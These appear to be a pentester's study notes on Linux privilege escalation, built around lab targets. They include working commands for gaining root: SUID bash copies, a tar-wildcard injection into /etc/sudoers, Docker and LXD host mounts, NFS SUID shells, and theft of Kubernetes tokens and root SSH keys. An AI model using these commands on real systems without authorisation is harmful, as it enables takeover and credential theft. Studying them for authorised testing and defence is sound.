**Online resources**:    
https://github.com/TCM-Course-Resources/Linux-Privilege-Escalation-Resources  
Basic Linux Privilege Escalation - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/  
Linux Privilege Escalation - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md  
Checklist - Linux Privilege Escalation - https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist  
Sushant 747's Guide - may need VPN - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html  

**Automation tools**:  
LinPeas https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  
LinEnum https://github.com/rebootuser/LinEnum  //very similar to linpeas  
Linux Priv Checker - https://github.com/sleventyeleven/linuxprivchecker  
Teddybears picnic  //linpeas first then others  
Linux Exploit Suggester - https://github.com/mzet-/linux-exploit-suggester  
Try run this if nothing on linpeas !!  suggests potential cve's – meterpreter can auto exploit - load suggester !  

## Enumeration/Info Gathering/Password hunting  
Check teddy  
history  
su root  //password123  
try exposed ssh keys  

## Environment based privesc  
### 1. PATH Abuse  
echo $PATH, dot . in here is dangerous because it makes any current dir valid PATH for binaries  
why dangerous.. placing a malicious ls file in /tmp and priv user runs it from /tmp - gets executed  
also check if any unusual writable directorie - can be abused same way  
### 2. Wildcard abuse  
covered in cron wildcard abuse  
### 3. Escaping Restricted Shells  
shell that limits user's ability, ex: websense cli, rbash, rksh, rzsh    
https://vk9-sec.com/linux-restricted-shell-bypass/  
Examples:  
ssh htb-user@10.129.37.149 -t "bash --noprofile"  
ls -l `pwd`     //even though pwd is not allowed its executed when passed as argument  
There are several methods such as command injection, substitution, chaining, environment variables, shell functions.  
When hit with restricted shell – read and explore the articles related to specific rshell.  

## Permission based privesc  
### 1. Basic  
Ls –la /etc/passwd        //check if we can read write user password files    
Ls –la /etc/shadow          //we could update or insert our pass in passwd or shadow    
Unshadow passwd.file shadow.file   //places hashes into x of passwd file //delete no hash users and crack it. Copy just the hashes for users and crack it  
Check hashcat hash examples and find module to run. 
Hashcat –m 1800 creds.file /usr/share/wordlists/rockyou.txt  

### 2. Sudo Rights Abuse: 
When the sudo command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in /etc/sudoers.  
always check to see if the current user has any sudo privileges.  
If NOPASSWD - then no password, otherwise user pass required to run sudo rights  
sudo -l   //sudo el to list sudp privs  //use gtfobins to check if any can be exploited to escape to shell  
#### Via Intended functionality  
if nothing on gtfobins for sudo listed binaries, its still possible to escalate with thier intended functionalities  
examples: wget to read/post shadow file, apache2 to read shadow file  -- just google  
#### Via LD_PRELOAD  
sudo –l shows env_keep+=LD_PRELOAD is enabled  //if enabled  
!! Loads malicious library before all libraries !!  
https://medium.com/@amaraltohami30/ld-preload-privilege-escalation-linux-priv-escalation-c8abdf1a9bec  
#### Outdated sudo  
CVE-2019-14287: sudo before 1.8.28 vulnerable to  if allowed to execute all except for root  
hacker ALL=(ALL,!root) /bin/bash  //can run bash except as root  
– user can trick sudo to still run as root !! Check https://www.exploit-db.com/exploits/47502  
CVE-2019-18634: Sudo versions prior to 1.8.26  – buffer overflow vulnerabilty  
asterisk * as we type password - only when pwfeedback is enabled   
check if pwfeedback enabled in /etc/sudoers - then can be exploited !! if cat't read /etc/sudoers still ok to give a shot       
https://github.com/saleemrashid/sudo-cve-2019-18634  
#### Sudoers best practice:  
Always specify absolute path to any binaries, otherwise PATH abuse.  

### 3. Special permissions: setuid and setgid  
https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits  
setuid allows program/script to be run with permissions of owner of the file typically with elevated privs..  
setuid bit appears as an s instead of x in owner perms  -rwsr-xr-x  
find / -perm -4000 -type f 2>/dev/null -ls //suid  
find / -perm -2000 -type f 2>/dev/null -ls //sgid  
Sticky bits: when set others can't delete the user files. Good for /tmp - so can't delete other users files.  
// next use GTFO bins to see if any unusual    
Exploitables: systemctl, tcpdump, vim etc  
//suid is set on passwd doesn't work - why ? because passwd not vul and doesn;t allow shell escape ?  
//think of this as on top of sudo or similar - if wget has it set - can read shadow because its run as root !!  
#### Suid files Via Shared Object Injection:  
similar to dll injection, can try on both custom sudo enabled/suid executables if the binary lods libraries from writable locations.  
say no gtfo shortcut, still investigate further for custom executables for any missing library  
and replace it with your malicious library to escalate privileges !!  
find / -type f -perm -4000 -ls 2>/dev/null 
strace /usr/local/bin/suid-so   //debug tool to see what process does with linux kernel  
Look for no such file or directory errors  
Strace /usr/local/bin/suid-so 2>&1 | grep -I –E "open|access|no such file"  
Look for any files that you can write.. In this case /home/user/.config/libcalc.so   
--- just create a file and run executable again – it should catch your file and run it !  
Search for c shell code !! Compile it and place it in that directory with that name !!  

#### SUID escalation via Environment variable       
find / -type f -perm -4000 -ls 2>/dev/null   
say custom binary with no gtfo exploit.. no shared injection  
strings /usr/local/bin/suid-env  //try check if its calling something inside,  
so this is running service apache2 start command – no full path for service  
place a malicious service in tmp and add tmp to PATH 
export PATH=/tmp:$PATH  //running suid exe should now refer malicious service giving elevated bash  
Say, full path is in use /usr/bin/service apache2 start  
//can declare a function of that name /usr/bin/service and add it to env variable which gets run on suid file exe  
function /usr/bin/service() {cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }  
export -f /usr/bin/service  //exporting the function as env varia  
//running the suid binary now gives an elevated bash !!  
Question around this -- what's the root cause here ? how define any such calls in suid files ?  

#### Escalation via Binary Symlinks  
one of the tests, cron jobs had a symlink run by root - not vulnerable, as symlink dire was not writable  
vulnerable if can change/update symlinks - need write perms - can maybe make it point to then run bin/bash instead ?   
Probably similar case with nginx version until 1.6.2 - CVE-2016-1247 //exploit suggester flags this  
exploit: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html  
nginx issue: ss –la /var/log/nginx  - dir owned by web user www-data - replace a file here with a symlink and restart nginx 
Upon nginx startup/restart the logs would be written to the file pointed to  ..hence the vulnera  
requires: vulnerable nginx version <=1.6.2 and suid on sudo which is always the case  

### 4. Capabilities  
Linux capabilities are kernel-level permissions, A process/binary can run as non-root but still perform certain privileged operations.  
For example, if the cap_net_bind_service capability is set for a binary,    
the binary will be able to bind to network ports, which is a privilege usually restricted.  
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;  
getcap –r / 2>dev/null      //look everywhere  
dangerous capabilities: cap_setuid+ep(similar to cloud setiampolicy), cap_dac_override and many others  
https://tbhaxor.com/exploiting-linux-capabilities-part-2/  

### 5. Privileged Group memberships:  id  
if member of following privileged groups: LXC/LXD, Docker, ADM  
LXC/LXD, Docker group - can create a new container mounting /root of host  
ADM group - allows to read all logs in /var/log - leveraged to gather sensi data stored  

## Service based privesc  
### 1. Vulnerable Services:  
screen terminal multiplexer version 4.5.0 has priv esc vul due to lack of permission check when opening a log file.  
screen –v  
./screen_exploit.sh  
### 2. Cron job abuse  
#### Escalation via Cron Paths  
cat /etc/crontab -- /home/user is a valid path in crontab, cronjob run overwrite.sh  
but with no full path, place a malicious overwrite.sh in /home/user - gets run giving elevated bash  
cp /bin/bash /tmp/bash; chmod +s /tmp/bash   //copy and set sid - good payload  
#### Escalation via Cron File Overwrites  
if file run by root in cronjob is writable - just put your own shell in it or copy bash into /tmp and set suid  
#### Escalation via Cron Wildcards  
\* , ?, [ ], ~ , -        //some common wildcards to do file/character replacements.  
say there is a cron job that backups all files in folder using * as the wildcard using tar command !  
can be in compress.sh or direct command \*/01 \* \* \* \* cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz \*  
We can leverage the wild card in the cron job to write out the necessary commands as file names  
When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.  
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh   //make root.sh executable  
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"  
htb-student@NIX02:~$ echo "" > --checkpoint=1  
This creates 2 empty files with checkpoint action and checkpoint and the action executes root.sh file  
which contains echo script to write to sudoers file to give all permissions to the user !!  

Systemd timers  //simialr to cronjobs ??  
Systemctl list-timers –all       //will list all timers  

### 3. LXD: LXC/LXD group membership.   
If we can't Download a container, check the image templates already avaialble on the system.  
cd ContainerImages  
lxc image import ubuntu-template.tar.xz --alias ubuntutemp  
lxc image list       //imports the image  
lxc init ubuntutemp privesc -c security.privileged=true  
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true  
//mounts the root filesystem to container and accessing it  
lxc start privesc  
lxc exec privesc /bin/bash  
ls -l /mnt/root  

### 4. Docker  
#### Member of Docker group  
docker run -v /:/mnt --rm -it bash chroot /mnt sh    //bash instead of alpine  
#### Docker Shared library  
- check directories that could be used by docker for persistent storage. Might find ssh keys that can be used.
#### docker.sock exposed  
By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources.  
interact with docker socket, docker group member list and import new container with root filesystem mounted.  
A case that can also occur is when the Docker socket is writable. Usually, this socket is located in /var/run/docker.sock.  
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash  

### 5. Kubernetes: many scenarios.. shell on worker node, kubelet exposed, on container  
steal the service token and cert at /var/run/secrets/kubernetes.io/serviceaccount/  
use it with kubectl to check perms and list pods  
exec into any pods and steal ssh creds -- /root/rot/.ssh/id_rsa  etc.. refer k8srta notes  
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods  
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc   
kubeletctl to interact with worker node kubelet api..  

### 6. Logrotate: /var/log   
a tool called logrotate takes care of archiving or disposing of old logs  
To Exploit logrotate:  
we need write perm on log files, logrotate must be run as root or privilged user and  
must be running on vulnerable version of 3.8.6, 3.11.0, 3.15.0,3.18.0  
git clone https://github.com/whotwagner/logrotten  
config stored at: /etc/logrotate.conf, /etc/logrotate.d/  

### 7. Miscellaneous techniques  
#### Tcpdump: if can run tcpdump, capture traffic and analyze for any creds in cleartext protocols.  
#### Weak NFS privileges: NFS port 2049  
showmount -e 10.129.2.12     //list accessible mounts on target server  
cat /etc/exports      //check if no_root_squash is set for filesystems exportable to NFS clients  
Remote users connecting to the share as the local root user will be able to create files  
on the NFS server as the root user. exploit by creating malicious scripts/programs with the SUID bit set.  
//problem here, sid bit stays on remote nfs, running it runs as root  
sudo mount -t nfs 10.129.2.12:/tmp /mnt   //mount the nfs -  be a root user.  
cp shell /mnt    //copy revshell or any payload    
Chmod u+s /mnt/shell  //suid bit setting  
Now switch back to the target and run the shell to get escalated privilege !  
#### Hijacking Tmux Sessions: read more    
a user may leave a tmux process running as a privileged user,  
such as root set up with weak permissions, and can be hijacked. By creating a shared session and modifying ownership.  
tmux -S /shareds new -s debugsess  
chown root:devs /shareds  
ps aux | grep tmux  //check for tmux sessions  
ls -la /shareds  
id     //check our group member part of dev group  
tmux –S /shareds   //attach to the shared tmus session and confirm root privileges  
dd  

## Kernel Exploits:  Kernel is an interface between software and hardware.  
Note: Kernel exploits can cause system instability so use caution when running these against a production system.  
And some work out of the box and some require modification.  Google kernel/OS version to find any ..  
uname -a   //print kernel version
hostnamectl  //better  
cat/etc/ls-release  //os version  
User exploit suggester to suggest any available exploits  
Well known exploits:  
Dirty Cow - Linux Kernel 2.6.22 < 3.9  - CVE-2016-5195 - Race condition  
CVE-2017-16995 Linux Kernel < 4.4.0-116 – Ubuntu 16.04.4 - Buffer overflow   
